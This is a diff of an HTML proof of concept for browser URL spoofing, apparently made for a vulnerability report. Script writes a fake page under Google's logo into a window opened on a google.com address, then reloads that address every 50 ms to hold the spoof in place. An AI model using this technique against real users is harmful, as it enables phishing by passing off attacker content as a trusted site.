@@ -4,7 +4,7 @@
 <button onclick="testRedirect()">Clickk  tto spoof</button>
 <script>
 function testRedirect() {
-    let win = window.open("https://www.google.com:8080", "https://www.google.com:8080");
+    let win = window.open("https://www.google.com/csi", "https://www.google.com:8080");
     let payload = '<div style="text-align:center; font-family:Arial, sans-serif;">' +
         '<img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" style="margin-top:20px;">' +
         '<h1>This is NOT Google!</h1>' +
@@ -15,8 +15,7 @@ function testRedirect() {
     win.document.write(payload);
     win.document.close();
     setInterval(function() {
-        win.document.stop();
-        win.location.replace("https://www.google.com:8080");
+        win.location.replace("https://www.google.com/csi");
     }, 50);  // Small interval to preserve the spoof
 }
 </script>
